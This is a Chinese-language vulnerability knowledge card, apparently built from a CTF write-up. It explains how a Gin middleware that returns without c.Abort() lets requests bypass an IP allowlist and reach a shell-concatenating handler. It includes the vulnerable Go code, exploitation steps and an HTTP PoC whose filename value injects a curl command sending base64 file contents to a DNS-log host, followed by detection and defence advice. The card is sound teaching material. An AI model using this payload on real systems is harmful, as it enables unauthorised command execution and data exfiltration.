---
id: web-golang-gin-middleware-missing-abort-authz-bypass-rce
title: Gin 中间件校验失败只 return 未 c.Abort()：IP 白名单形同虚设，未授权触达命令拼接接口 RCE
type: scenario
domain: web
path: web/golang
technique: gin-middleware-missing-abort-check-bypass
aliases:
- Gin 中间件未 Abort
- c.Abort 缺失绕过
- Gin 中间件 return 无效
- IP 校验绕过
- gin.Context.Next 继续执行
tags:
- golang
- gin
- middleware
- authz-bypass
- command-injection
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V518
  verified_at: '2026-11-11T13:07:39+08:00'
  notes: 已对照原文与10张截图核对：IpSecurityCheck 校验失败 c.JSON 后仅 return、缺 c.Abort() 的错误写法（图06）与补 c.Abort() 的正确写法（图07）、SubmitMoveHandler 的 exec.Command("/bin/bash","-c","mv ./upload/pdf/"+filename.Filename+" ./assert/pdf/") 拼接（图05）、POST /move 传入 {"filename":";curl http://xxxx.ceye.io/`cat /flag | base64`;"}（图08/09）、ceye DNS 日志收到 base64 flag（图10）均一致，最终 RCE 危害已证明。未验证点：PoC 未复跑；原文未给 Gin 版本标记。dedup：与 multipart 文件名命令注入等既有卡根因（中间件未 Abort）不同，保留。
---

## 一句话结论

Gin 的中间件链由 `c.Next()` 驱动：校验失败时若只写 `c.JSON(...); return` 而没有调用 `c.Abort()`，`return` 只结束当前中间件函数，`c.Next()` 仍会继续执行后续 handler——看似受 IP 白名单/登录校验保护的路由实际完全开放；若该路由内存在命令拼接（如 `exec.Command("/bin/bash","-c","mv .../"+filename)`），未授权即可命令注入拿 RCE。

## 原理

- **Gin 中间件执行模型**：`gin.Engine` 把路由的 handler 链按顺序放在 `c.handlers` 中，`c.Next()` 从当前位置循环调用剩余 handler。中间件里写了 `c.Next()` 或默认由框架推进；`return` 只退出**当前函数**，不影响 `c.Next()` 的循环继续。
- **Abort 的作用**：`c.Abort()` 设置 `c.index = abortIndex`，使后续 `c.Next()` 循环不再执行剩余 handler；只 `return` 不 `Abort`，后面的业务 handler 照常被调用。
- **典型错误写法**：
  ```go
  if badIP {
      c.JSON(403, gin.H{"msg": "No you're not allowed"})
      return          // 缺少 c.Abort()
  }
  c.Next()            // 即使上面 return，本次请求仍会进入后续 handler
  ```
  正确写法是在 `c.JSON` 后调用 `c.Abort()`（或 `c.AbortWithStatusJSON`）再 return。
- **与校验逻辑的关系**：即使 IP 判断本身正确（如只允许 `127.0.0.1`/`localhost`），缺少 Abort 时任何外部 IP 的请求都会继续到达受保护 handler；同理适用于登录态校验、权限校验等所有中间件。
- **汇合点**：受保护 handler 若把用户输入拼进 shell（`exec.Command("/bin/bash","-c","mv ./upload/pdf/"+filename+" ./assert/pdf/")`），攻击者传入 `;curl http://dnslog/` 即可命令注入；无回显时用 DNS/HTTP 外带读取 flag/文件。

## 触发条件

- 应用使用 Gin，且路由挂了做安全校验的中间件。
- 中间件在校验失败分支只 `return`/写响应，未调用 `c.Abort()`。
- 受保护 handler 存在危险操作（命令执行拼接、文件操作、敏感数据查询等）。
- 攻击者能直接访问该路由（IP 不受限或可绕过）。

## 利用步骤

1. 审计路由注册与中间件代码，寻找 `if <校验失败> { c.JSON/...; return }` 而缺少 `c.Abort()` 的模式。
2. 直接用非白名单来源访问受保护路由（如 `POST /move`），确认响应不再 403、而是进入业务逻辑（返回业务错误或成功）。
3. 分析受保护 handler 的输入拼接：本例 `mv ./upload/pdf/<filename> ./assert/pdf/`，`filename` 来自 JSON `{"filename": ...}`。
4. 构造命令注入 payload，例如 `{"filename":";curl http://<dnslog>/`cat /flag|base64`;"}`，通过 DNS/HTTP 回连外带结果。
5. 若需要写文件/读文件，可组合 `;`、`$()`、反引号等 shell 语法。

## PoC

```go
// 有缺陷的中间件：校验失败只 return，未 Abort
func IpSecurityCheck() gin.HandlerFunc {
    return func(c *gin.Context) {
        if c.Request.RemoteAddr[:9] != "127.0.0.1" && c.Request.RemoteAddr[:9] != "localhost" {
            c.JSON(403, gin.H{"msg": "No you're not allowed"})
            return // 缺少 c.Abort()
        }
        c.Next()
    }
}

// 受保护的命令拼接 handler
func SubmitMoveHandler(c *gin.Context) {
    var filename Filename
    if err := c.ShouldBindJSON(&filename); err != nil { ... }
    cmd := exec.Command("/bin/bash", "-c", "mv ./upload/pdf/"+filename.Filename+" ./assert/pdf/")
    cmd.Run()
    c.JSON(200, gin.H{"message": filename.Filename})
}
```

```http
POST /move HTTP/1.1
Host: target
Content-Type: application/json

{"filename":";curl http://<dnslog-domain>/`cat /flag | base64`;"}
```

外部 IP 也能到达 handler；shell 执行 `mv ./upload/pdf/;curl http://...`，命令替换的结果出现在 DNS/HTTP 请求中。

## 变体与关联

- **中间件家族**：登录校验、JWT 校验、角色校验、频率限制、签名校验等任何「失败只 return」的写法都等价于没有保护。
- **其它框架对照**：Java Servlet Filter 若 `doFilter` 后未 return/未阻断，同样会继续链式调用；PHP 老系统「判断后没有 exit」导致重装漏洞是同一类逻辑缺陷。
- **触发链组合**：中间件绕过本身只是「未授权访问」，最终危害取决于 handler；本例与管道命令拼接组合成 RCE。
- **正确写法**：`c.AbortWithStatusJSON(403, ...); return`；或在中间件末尾只让成功分支 `c.Next()`。

## 检测与防御

- **检测**：代码审计搜索 Gin 中间件中以 `return` 结束且上下文无 `c.Abort`/`AbortWithStatus` 的失败分支；运行时对受保护路由用外部 IP 与异常参数做未授权测试。
- **防御**：校验失败统一 `c.AbortWithStatusJSON`；中间件拆分「只做校验」与「调用 Next」两部分，确保失败路径不落到 Next；对命令执行等危险操作避免 shell 拼接，改用参数化 exec（`exec.Command("mv", src, dst)`）并校验文件名白名单。
